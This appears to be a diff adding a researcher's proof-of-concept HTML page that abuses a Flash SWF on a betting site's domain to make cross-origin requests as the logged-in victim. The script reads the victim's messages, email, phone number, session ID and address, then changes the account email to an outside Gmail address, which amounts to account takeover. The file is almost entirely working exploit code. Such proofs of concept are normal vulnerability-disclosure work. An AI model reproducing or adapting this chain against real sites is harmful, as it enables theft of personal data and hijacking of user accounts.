@@ -1,0 +1,64 @@
+<body>
+<style>pre { white-space: inherit; }</style>
+<div id="flash"></div>
+<pre id="log"></pre>
+<script>
+var x;
+function log(s) { var l = document.createElement('pre'); l.innerText=s; document.getElementById('log').appendChild(l); }
+function flashload(url,data,fnc){
+    url = url.split(' ')
+	method = url.shift();
+	url = url.join(' ');
+    ct = ""
+    if(typeof data != "string") { 
+      data = JSON.stringify(data);
+      ct = "%26ct=application/json"
+    }
+    data = escape(escape(data)).replace(/\+/g,'%252b')
+	document.getElementById('flash').innerHTML = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="10" height="10" id="x"><param name="allowScriptAccess" value="always" /><param name="movie" value="https://l.unibet.fr/unibet/video/PerformLivePlayer.swf" /><param name="quality" value="high" /><param name="FlashVars" value="akamaiMonitorSWF=https://detectify-labs.s3.amazonaws.com/callback-loadmovie-poc.swf%3fu='+url+'%26f='+fnc+'%26m='+method+'%26d='+data+ct+'" /><embed src="https://l.unibet.fr/unibet/video/PerformLivePlayer.swf" flashvars="akamaiMonitorSWF=https://detectify-labs.s3.amazonaws.com/callback-loadmovie-poc.swf%3fu='+url+'%26f='+fnc+'%26m='+method+'%26d='+data+ct+'" quality="high" width="10" height="10" name="x" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /></object>';
+}
+function dataSplit(d,p,s) {
+  d=d.substr(d.indexOf(p));
+  d=d.substr(p.length);
+  d=d.substr(0, d.indexOf(s));
+  return d;
+}
+function step1(s) {
+	log('Fetching messages...');
+	flashload('GET //se.unibet.com/mom-api/messages/x', '', 'step1done');
+}
+function step1done(s) {
+	log(unescape(s))
+	step2();
+}
+function step2() {
+	log('Fetching email+session+phone...');
+	flashload('GET //se.unibet.com/myaccount/mydetails/editdetails', '', 'step2done');
+}
+function step2done(s) {
+	s=unescape(s);
+	log('email: ' + dataSplit(s, "email: '", "'"))
+	log('phoneNumber: ' + dataSplit(s, "phoneNumber: '", "'"))
+	log('sessionId: ' + dataSplit(s, "sessionId: '", "'"))
+	log('qualifiedUserName: ' + dataSplit(s, "qualifiedUserName: '", "'"))
+	step3();
+}
+function step3() {
+	log('Fetching address...')
+	flashload('GET https://se.unibet.com/custard/pubcustard/secure/customers/profile?_=1515110776717', '', 'step3done');
+}
+function step3done(s) {
+	log(unescape(s))
+	step4();
+}
+function step4() {
+    emailto = 'frans.rosen+unibet' + (Math.random()+'').split('.')[1] + '@gmail.com'
+	log('Changing email to: ' + emailto + '...')
+	flashload('POST https://se.unibet.com/custard/pubcustard/secure/customers', {"customerProfile":{"email":emailto}}, 'step4done');
+}
+function step4done(s) {
+	log(unescape(s))
+}
+step1();
+</script>
+</body>
